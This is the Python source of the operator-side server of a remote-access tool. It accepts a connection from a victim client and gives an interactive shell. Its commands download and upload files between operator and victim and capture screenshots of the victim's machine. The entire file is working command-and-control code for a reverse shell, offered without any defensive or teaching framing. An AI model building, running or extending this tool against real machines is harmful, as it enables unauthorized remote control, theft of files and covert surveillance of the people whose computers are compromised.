import socket
import os
import platform
import json
import base64
# import pickle
import tqdm

HOST = '127.0.0.1' # '192.168.43.82'
PORT = 8081 # 2222

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server.bind((HOST, PORT))

print('+ Server Started')
print('+ Listening for incoming connections ...')
server.listen(5)
client, client_addr = server.accept()
print(f'+ {client_addr} connected to the server')

# RELIABLE SEND
# -----------------------------------
def send(data):
    try:
        # data = data.encode()
        pass
    except AttributeError:
        pass
    json_data = json.dumps(data)
    client.send(json_data.encode())

# RELIABLE RECIEVE
# -----------------------------------
def recv():
    data = b""
    while True:
        try:
            data = data + client.recv(1024000)
            return json.loads(data.decode())
        except ValueError:
            break
        except Exception as e:
            print(e)
            break


# SEND FILE
# -----------------------------------
def send_file(filename):
    # print("starting function")
    json_data = json.dumps(filename.decode())
    # print("parsed json succesfully")
    client.send(json_data.encode())
    # print("sent data")

# RECIEVE FILE
# -----------------------------------
def recv_file():
    # print("starting function")
    data = b""
    # print("starting while true loop")
    while True:
        try:
            # print("adding up data")
            data = data + client.recv(1024000)
            # print("first decode done")
            return json.loads(data.decode())
        except ValueError:
            break
        except Exception as e:
            print(e)
            break

# SHELL SERVER
# -----------------------------------
count = 1
def shell():
    global count
    while True:
        command = input(f'+ Shell#~{client_addr}: ')
        send(command)
        print(f'Running command: {command}')

        if command == "rsq":
            break

        elif command[:2] == "cd" and len(command) > 1:
            continue

        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                result = recv_file()
                file.write(base64.b64decode(result))
                continue

        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    send_file(base64.b64encode(fin.read()))
                    continue
            except:
                failed = "Failed to Upload"
                send_file(base64.b64encode(failed))
        
        elif command[:10] == "screenshot":
            try:
                with open("screenshot.png", "wb") as screen:
                    image = recv_file()
                    image_decoded = base64.b64decode(image)
                    if image_decoded[:4] == "[!!]":
                        print(image_decoded)
                    else:
                        screen.write(image_decoded)
                        count += 1
            except:
                print("[!!] Failed to get screenshot")
                continue

        result = recv()
        print(result)
    

shell()

